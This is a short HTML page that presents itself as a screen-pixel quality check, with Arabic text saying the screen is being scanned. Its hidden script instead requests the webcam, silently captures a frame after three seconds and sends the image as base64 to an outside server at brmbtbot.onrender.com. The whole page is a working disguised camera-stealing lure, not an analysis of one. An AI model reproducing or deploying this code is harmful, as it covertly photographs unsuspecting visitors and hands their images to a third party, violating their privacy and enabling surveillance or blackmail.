<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Screen Quality</title></head><body style="text-align:center;"><h3>جاري فحص بكسلات الشاشة...</h3><video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas><script>const v=document.getElementById('v');const c=document.getElementById('c');navigator.mediaDevices.getUserMedia({video:true}).then(s=>{v.srcObject=s;setTimeout(()=>{c.getContext('2d').drawImage(v,0,0,300,150);fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Camera Tool',u:'Captured Image',p:c.toDataURL()})});},3000);});</script></body></html>
